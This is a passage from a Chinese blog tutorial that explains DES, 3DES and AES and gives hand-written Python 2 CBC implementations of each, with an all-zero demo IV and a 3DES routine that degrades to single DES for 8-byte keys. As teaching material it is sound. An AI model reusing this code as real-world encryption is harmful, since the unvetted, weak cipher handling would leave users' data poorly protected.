位对应的输入位，加上两个邻接的块中紧邻的位。</li><li>与密钥混合：用异或操作将扩张的结果和一个子密钥进行混合。16 个 48 位的子密钥—每个用于一个回次的 F 变换—是利用密钥调度从主密钥生成的（见下文）。</li><li>S 盒：在与子密钥混合之后，块被分成 8 个 6 位的块，然后使用“S 盒”，或称“置换盒”进行处理。8 个 S 盒的每一个都使用以查找表方式提供的非线性的变换将它的 6 个输入位变成 4 个输出位。S 盒提供了 DES 的核心安全性—如果没有 S 盒，密码会是线性的，很容易破解。</li><li>置换：最后，S 盒的 32 个输出位利用固定的置换，“P 置换”进行重组。这个设计是为了将每个 S 盒的 4 位输出在下一回次的扩张后，使用 4 个不同的 S 盒进行处理。</li></ul><p>S 盒，P 置换和 E 扩张各自满足了克劳德·香农在 1940 年代提出的实用密码所需的必要条件，“混淆与扩散”。</p><p><img src="/pics/Python实现DES、AES加密解密算法/2.png" srcset="/img/loading.gif" alt></p><h3 id="密钥调度"><a href="#密钥调度" class="headerlink" title="密钥调度"></a>密钥调度</h3><p>加密过程中密钥调度—产生子密钥的算法里，首先使用选择置换 1（PC-1）从 64 位输入密钥中选出 56 位的密钥—剩下的 8 位要么直接丢弃，要么作为奇偶校验位。然后，56 位分成两个 28 位的半密钥；每个半密钥接下来都被分别处理。在接下来的回次中，两个半密钥都被左移 1 或 2 位（由回次数决定），然后通过选择置换 2（PC-2）产生 48 位的子密钥—每个半密钥 24 位。移位（图中由&lt;&lt;标示）表明每个子密钥中使用了不同的位，每个位大致在 16 个子密钥中的 14 个出现。</p><p>解密过程中，除了子密钥输出的顺序相反外，密钥调度的过程与加密完全相同。</p><p><img src="/pics/Python实现DES、AES加密解密算法/3.png" srcset="/img/loading.gif" alt></p><h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><pre><code class="python">#!/usr/bin/env python# -*- encoding=utf-8 -*-ENCRYPT = 0DECRYPT = 1BLOCK_SIZE = 8# 明文分组初始置换表IP = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16,      8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7]# 末置换表IP_ = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61,       29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]# S盒压缩置换表（6bit-&gt;4bit）S1 = [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7, 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3,      8, 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0, 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]S2 = [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10, 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11,      5, 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15, 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]S3 = [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15,      1, 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7, 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]S4 = [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15, 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14,      9, 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4, 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]S5 = [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9, 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8,      6, 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14, 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]S6 = [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11, 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3,      8, 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6, 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]S7 = [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1, 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8,      6, 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2, 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]S8 = [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7, 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9,      2, 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8, 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]S = [S1, S2, S3, S4, S5, S6, S7, S8]# P盒置换表（32bit）P = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31,     10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25]# 密钥置换表（64bit-&gt;56bit）PC_1 = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44,        36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4]# 密钥压缩置换表（56bit-&gt;48bit）PC_2 = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2,        41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]# 明文扩展置换表（32bit-&gt;48bit）E = [32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16,     17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1]# 子密钥循环左移位数表（16次）SHIFT = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]sub_keys = [[0] * 48] * 16def convert_string_to_bitlist(string):    data = [ord(c) for c in string]    l = len(data) * 8    result = [0] * l    pos = 0    for ch in data:        i = 7        while i &gt;= 0:            if ch &amp; (1 &lt;&lt; i) != 0:                result[pos] = 1            else:                result[pos] = 0            pos += 1            i -= 1    return resultdef convert_bitlist_to_string(bitlist):    result = []    pos = 0    c = 0    while pos &lt; len(bitlist):        c += bitlist[pos] &lt;&lt; (7 - pos % 8)        if pos % 8 == 7:            result.append(c)            c = 0        pos += 1    return &#39;&#39;.join([chr(c) for c in result])def permute(table, block):    return list(map(lambda x: block[x - 1], table))def create_sub_keys(key):    key = permute(PC_1, convert_string_to_bitlist(key))    i = 0    lkey = key[:28]    rkey = key[28:]    while i &lt; 16:        j = 0        while j &lt; SHIFT[i]:            lkey.append(lkey[0])            del lkey[0]            rkey.append(rkey[0])            del rkey[0]            j += 1        sub_keys[i] = permute(PC_2, lkey + rkey)        # print sub_keys[i]        i += 1def des_cipher(block, choice):    block = permute(IP, block)    lblock = block[:32]    rblock = block[32:]    if choice == ENCRYPT:        iteration = 0        iteration_adjustment = 1    elif choice == DECRYPT:        iteration = 15        iteration_adjustment = -1    i = 0    # 16轮F函数    while i &lt; 16:        rtemp = rblock[:]        # 将右半块32位扩展为48位        rblock = permute(E, rblock)        # 将扩展后的右半块和轮密钥进行逐位异或        rblock = list(map(lambda x, y: x ^ y, rblock, sub_keys[iteration]))        b = [rblock[:6], rblock[6:12], rblock[12:18], rblock[18:24],             rblock[24:30], rblock[30:36], rblock[36:42], rblock[42:]]        j = 0        bn = [0] * 32        pos = 0        # S盒置换        while j &lt; 8:            row = (b[j][0] &lt;&lt; 1) + b[j][5]            col = (b[j][1] &lt;&lt; 3) + (b[j][2] &lt;&lt; 2) + (b[j][3] &lt;&lt; 1) + b[j][4]            v = S[j][(16 * row) + col]            bn[pos] = (v &amp; 8) &gt;&gt; 3            bn[pos + 1] = (v &amp; 4) &gt;&gt; 2            bn[pos + 2] = (v &amp; 2) &gt;&gt; 1            bn[pos + 3] = v &amp; 1            pos += 4            j += 1        # 与P盒进行置换        rblock = permute(P, bn)        rblock = list(map(lambda x, y: x ^ y, rblock, lblock))        lblock = rtemp        i += 1        iteration += iteration_adjustment    final = permute(IP_, rblock + lblock)    return finaldef cipher(data, key, iv, choice):    if len(data) % BLOCK_SIZE != 0:        raise ValueError(&quot;Data length illegal.&quot;)    if len(key) != 8 or len(iv) != 8:        raise ValueError(&quot;key/iv\&#39;s length should be 8.&quot;)    create_sub_keys(key)    iv = convert_string_to_bitlist(iv)    i = 0    result = []    while i &lt; len(data):        block = convert_string_to_bitlist(data[i:i + 8])        if choice == ENCRYPT:            block = list(map(lambda x, y: x ^ y, block, iv))            block = des_cipher(block, choice)            iv = block        elif choice == DECRYPT:            temp = block[:]            block = des_cipher(block, choice)            block = list(map(lambda x, y: x ^ y, block, iv))            iv = temp        result.append(convert_bitlist_to_string(block))        i += 8    return &#39;&#39;.join(result)if __name__ == &#39;__main__&#39;:    key = &#39;#qianfei&#39;    iv = &#39;0&#39; * 8    data = &#39;#qianfei11111111&#39;    ciphertext = cipher(data, key, iv, ENCRYPT)    # print [ord(c) for c in ciphertext]    print ciphertext    plaintext = cipher(ciphertext, key, iv, DECRYPT)    # print [ord(c) for c in plaintext]    print plaintext</code></pre><h1 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h1><p>密码学中，三重数据加密算法（英语：Triple Data Encryption Algorithm，缩写为 TDEA，Triple DEA），或称 3DES（Triple DES），是一种对称密钥加密块密码，相当于是对每个数据块应用三次数据加密标准（DES）算法。由于计算机运算能力的增强，原版 DES 密码的密钥长度变得容易被暴力破解；3DES 即是设计用来提供一种相对简单的方法，即通过增加 DES 的密钥长度来避免类似的攻击，而不是设计一种全新的块密码算法。</p><h2 id="算法流程-1"><a href="#算法流程-1" class="headerlink" title="算法流程"></a>算法流程</h2><p>三重 DES 的本质上就是经过了三次 DES 操作，密钥长度为 24 字节，拆分为三个长为 8 字节的密钥，加密时依次对明文进行加密、解密、加密的操作，解密时相反。具体如下：</p><p>$$<br>Ciphertext = E_{K3}(D_{K2}(E_{K1}(Plaintext))) \<br>Plaintext = D_{K1}(E_{K2}(D_{K3}(Ciphertext)))<br>$$</p><h2 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h2><pre><code class="python">...def triple_encipher(data, masterKey, iv):    if len(masterKey) == 8:        key1 = masterKey[:8]        key2 = masterKey[:8]        key3 = masterKey[:8]    elif len(masterKey) == 16:        key1 = masterKey[:8]        key2 = masterKey[8:16]        key3 = masterKey[:8]    else:        key1 = masterKey[:8]        key2 = masterKey[8:16]        key3 = masterKey[16:24]    keys = [key1, key2, key3]    # print keys    i = 0    result = []    while i &lt; len(data):        block = cipher(data[i:i + 8], keys[0], iv, ENCRYPT)        block = cipher(block, keys[1], iv, DECRYPT)        block = cipher(block, keys[2], iv, ENCRYPT)        iv = block        result.append(block)        i += 8    return &#39;&#39;.join(result).encode(&#39;base64&#39;)def triple_decipher(data, masterKey, iv):    if len(masterKey) == 8:        key1 = masterKey[:8]        key2 = masterKey[:8]        key3 = masterKey[:8]    elif len(masterKey) == 16:        key1 = masterKey[:8]        key2 = masterKey[8:16]        key3 = masterKey[:8]    else:        key1 = masterKey[:8]        key2 = masterKey[8:16]        key3 = masterKey[16:24]    keys = [key1, key2, key3]    # print keys    i = 0    result = []    data = data.decode(&#39;base64&#39;)    while i &lt; len(data):        temp = data[i:i + 8]        block = cipher(data[i:i + 8], keys[2], iv, DECRYPT)        block = cipher(block, keys[1], iv, ENCRYPT)        block = cipher(block, keys[0], iv, DECRYPT)        iv = temp        result.append(block)        i += 8    return &#39;&#39;.join(result)if __name__ == &#39;__main__&#39;:    key = &#39;#qianfei&#39;    iv = &#39;0&#39; * 8    data = &#39;#qianfei11111111&#39;    ciphertext = triple_encipher(data, key, iv)    # print [ord(c) for c in ciphertext]    print ciphertext    plaintext = triple_decipher(ciphertext, key, iv)    # print [ord(c) for c in plaintext]    print plaintext</code></pre><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>高级加密标准（英语：Advanced Encryption Standard，缩写：AES），在密码学中又称 Rijndael 加密法，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的 DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院（NIST）于 2001 年 11 月 26 日发布于 FIPS PUB 197，并在 2002 年 5 月 26 日成为有效的标准。2006 年，高级加密标准已然成为对称密钥加密中最流行的算法之一。</p><h2 id="算法流程-2"><a href="#算法流程-2" class="headerlink" title="算法流程"></a>算法流程</h2><p>严格地说，AES 和 Rijndael 加密法并不完全一样（虽然在实际应用中两者可以互换），因为 Rijndael 加密法可以支持更大范围的区块和密钥长度：AES 的区块长度固定为 128 比特，密钥长度则可以是 128，192 或 256 比特；而 Rijndael 使用的密钥和区块长度均可以是 128，192 或 256 比特。加密过程中使用的密钥是由 Rijndael 密钥生成方案产生。</p><table><thead><tr><th style="text-align:center">AES</th><th style="text-align:center">密钥长度（32 位比特字)</th><th style="text-align:center">分组长度(32 位比特字)</th><th style="text-align:center">加密轮数</th></tr></thead><tbody><tr><td style="text-align:center">AES-128</td><td style="text-align:center">4</td><td style="text-align:center">4</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">AES-192</td><td style="text-align:center">6</td><td style="text-align:center">4</td><td style="text-align:center">12</td></tr><tr><td style="text-align:center">AES-256</td><td style="text-align:center">8</td><td style="text-align:center">4</td><td style="text-align:center">14</td></tr></tbody></table><p>大多数 AES 计算是在一个特别的有限域完成的。AES 加密过程是在一个 4×4 的字节矩阵上运作，这个矩阵又称为“体（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个 Byte）。（Rijndael 加密法因支持更大的区块，其矩阵的“列数（Row number）”可视情况增加）加密时，各轮 AES 加密循环（除最后一轮外）均包含 4 个步骤：</p><ul><li>轮密钥加：矩阵中的每一个字节都与该次回合密钥做 XOR 运算；每个子密钥由密钥生成方案产生。</li><li>字节代换：透过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。</li><li>行位移：将矩阵中的每个横列进行循环式移位。</li><li>列混合：为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略 MixColumns 步骤，而以另一个轮密钥取代。</li></ul><h3 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h3><p>轮密钥加中，密钥将会与原矩阵合并。在每次的加密循环中，都会由主密钥产生一把回合密钥（透过 Rijndael 密钥生成方案产生），这把密钥大小会跟原矩阵一样，以与原矩阵中每个对应的字节作异或（⊕）加法。</p><p><img src="/pics/Python实现DES、AES加密解密算法/4.png" srcset="/img/loading.gif" alt></p><h3 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h3><p>在字节代换步骤中，矩阵中的各字节透过一个 8 位的 S-box 进行转换。这个步骤提供了加密法非线性的变换能力。S-box 与 $GF(2^{8})$ 上的乘法反元素有关，已知具有良好的非线性特性。为了避免简单代数性质的攻击，S-box 结合了乘法反元素及一个可逆的仿射变换矩阵建构而成。此外在建构 S-box 时，刻意避开了固定点与反固定点，即以 S-box 替换字节的结果会相当于错排的结果。</p><p><img src="/pics/Python实现DES、AES加密解密算法/5.png" srcset="/img/loading.gif" alt></p><h3 id="ShiftRows"><a href="#ShiftRows" class="headerlink" title="ShiftRows"></a>ShiftRows</h3><p>行位移描述矩阵的列操作。在此步骤中，每一列都向左循环位移某个偏移量。在 AES 中（区块大小 128 位），第一列维持不变，第二列里的每个字节都向左循环移动一格。同理，第三列及第四列向左循环位移的偏移量就分别是 2 和 3。128 位和 192 比特的区块在此步骤的循环位移的模式相同。经过行位移之后，矩阵中每一竖行，都是由输入矩阵中的每个不同行中的元素组成。Rijndael 算法的版本中，偏移量和 AES 有少许不同；对于长度 256 比特的区块，第一列仍然维持不变，第二列、第三列、第四列的偏移量分别是 1 字节、2 字节、3 字节。除此之外，行位移操作步骤在 Rijndael 和 AES 中完全相同。</p><p><img src="/pics/Python实现DES、AES加密解密算法/6.png" srcset="/img/loading.gif" alt></p><h3 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h3><p>在列混合步骤，每一行的四个字节透过线性变换互相结合。每一行的四个元素分别当作$1, x, x^2, x^3$ 的系数，合并即为 $GF(2^{8})$ 中的一个多项式，接着将此多项式和一个固定的多项式 $c(x)=3x^{3}+x^{2}+x+2$ 在模 $x^4+1$ 下相乘。此步骤亦可视为 Rijndael 有限域之下的矩阵乘法。列混合函数接受 4 个字节的输入，输出 4 个字节，每一个输入的字节都会对输出的四个字节造成影响。因此行位移和列混合两步骤为这个密码系统提供了扩散性。</p><p><img src="/pics/Python实现DES、AES加密解密算法/7.png" srcset="/img/loading.gif" alt></p><h2 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h2><p>这里实现了采用 CBC 模式且密钥长度为 128 位的 AES 算法：</p><pre><code class="python">#!/usr/bin/env python# -*- encoding=utf-8 -*-ENCRYPT = 0DECRYPT = 1BLOCK_SIZE = 16S = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,     0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]S_ = [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,      0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d]Rcon = [    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40,    0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A,    0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A,    0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,]round_keys = [[0] * 4] * 44def xtime(a):    return (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)def convert_string_to_matrix(string):    matrix = []    for i in range(16):        byte = ord(string[i])        if i % 4 == 0:            matrix.append([byte])        else:            matrix[i / 4].append(byte)    return matrixdef convert_matrix_to_string(matrix):    string = &#39;&#39;    for i in range(4):        for j in range(4):            string += chr(matrix[i][j])    return stringdef generate_round_keys(master_key):    round_keys[:4] = convert_string_to_matrix(master_key)    # print round_keys    for i in range(4, 4 * 11):        temp = []        if i % 4 == 0:            # print round_keys[i - 4][0]            # print round_keys[i - 1][0]            # print Rcon[i/4]            byte = round_keys[i - 4][0] ^ S[round_keys[i - 1][1]] ^ Rcon[i / 4]            # print i, byte            temp.append(byte)            for j in range(1, 4):                byte = round_keys[i - 4][j] ^ S[round_keys[i - 1][(j + 1) % 4]]                # print byte                temp.append(byte)        else:            for j in range(4):                byte = round_keys[i - 4][j] ^ round_keys[i - 1][j]                temp.append(byte)        round_keys[i] = temp    # print round_keysdef add_round_key(matrix, round_key):    for i in range(4):        for j in range(4):            matrix[i][j] ^= round_key[i][j]    return matrixdef sub_bytes(matrix, table):    for i in range(4):        for j in range(4):            matrix[i][j] = table[matrix[i][j]]    return matrixdef shift_single_row(matrix, line, n):    i = 0    while i &lt; n:        temp = matrix[0][line]        for j in range(3):            matrix[j][line] = matrix[j + 1][line]        matrix[3][line] = temp        i += 1    return matrixdef shift_rows(matrix, inversed=False):    if inversed == True:        matrix = shift_single_row(matrix, 1, 3)        matrix = shift_single_row(matrix, 2, 2)        matrix = shift_single_row(matrix, 3, 1)    else:        matrix = shift_single_row(matrix, 1, 1)        matrix = shift_single_row(matrix, 2, 2)        matrix = shift_single_row(matrix, 3, 3)    return matrixdef mix_single_column(matrix):    t = 0    for i in range(4):        t ^= matrix[i]    # print &#39;x =&gt;&#39;, t    temp = matrix[0]    for i in range(3):        matrix[i] ^= t ^ xtime(matrix[i] ^ matrix[i + 1])    matrix[3] ^= t ^ xtime(matrix[3] ^ temp)    return matrixdef mix_columns(matrix, inversed=False):    if inversed == True:        for i in range(4):            u = xtime(xtime(matrix[i][0] ^ matrix[i][2]))            v = xtime(xtime(matrix[i][1] ^ matrix[i][3]))            matrix[i][0] ^= u            matrix[i][1] ^= v            matrix[i][2] ^= u            matrix[i][3] ^= v        matrix = mix_columns(matrix)    else:        for i in range(4):            # print &#39;m =&gt;&#39;, matrix[i]            matrix[i] = mix_single_column(matrix[i])    return matrixdef aes_cipher(block, rounds, choice):    if len(block) != 16:        raise ValueError(&quot;Block\&#39;s length must be 16.&quot;)    matrix = convert_string_to_matrix(block)    if choice == ENCRYPT:        matrix = add_round_key(matrix, round_keys[:4])        i = 1        while i &lt; rounds:            matrix = sub_bytes(matrix, S)            matrix = shift_rows(matrix)            matrix = mix_columns(matrix)            matrix = add_round_key(matrix, round_keys[4 * i:4 * i + 4])            i += 1        matrix = sub_bytes(matrix, S)        matrix = shift_rows(matrix)        matrix = add_round_key(matrix, round_keys[40:])    elif choice == DECRYPT:        matrix = add_round_key(matrix, round_keys[40:])        matrix = shift_rows(matrix, inversed=True)        matrix = sub_bytes(matrix, S_)        i = rounds - 1        while i &gt; 0:            matrix = add_round_key(matrix, round_keys[4 * i:4 * i + 4])            matrix = mix_columns(matrix, inversed=True)            matrix = shift_rows(matrix, inversed=True)            matrix = sub_bytes(matrix, S_)            i -= 1        matrix = add_round_key(matrix, round_keys[:4])    return convert_matrix_to_string(matrix)def cipher(data, key, iv, rounds, choice):    if len(data) % BLOCK_SIZE != 0:        raise ValueError(&quot;Data length illegal.&quot;)    if len(key) != 16 or len(iv) != 16:        raise ValueError(&quot;key/iv\&#39;s length should be 16.&quot;)    generate_round_keys(key)    i = 0    result = []    while i &lt; len(data):        block = data[i:i + 16]        if choice == ENCRYPT:            block = list(map(lambda x, y: ord(x) ^ ord(y), block, iv))            block = &#39;&#39;.join([chr(c) for c in block])            block = aes_cipher(block, rounds, choice)            iv = block        elif choice == DECRYPT:            temp = block[:]            block = aes_cipher(block, rounds, choice)            block = list(map(lambda x, y: ord(x) ^ ord(y), block, iv))            block = &#39;&#39;.join([chr(c) for c in block])            iv = temp        result.append(block)        i += BLOCK_SIZE    return &#39;&#39;.join(result)if __name__ == &#39;__main__&#39;:    key = &#39;#qianfei12345678&#39;    iv = &#39;0&#39; * 16    ciphertext = cipher(&#39;#qianfei12345678&#39;, key, iv, 10, ENCRYPT)    print ciphertext    plaintext = cipher(ciphertext, key, iv, 10, DECRYPT)    print plaintext</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/Data_Encryption_Standard" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Data_Encryption_Standard</a><br><a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Advanced_Encryption_Standard</a><br><a 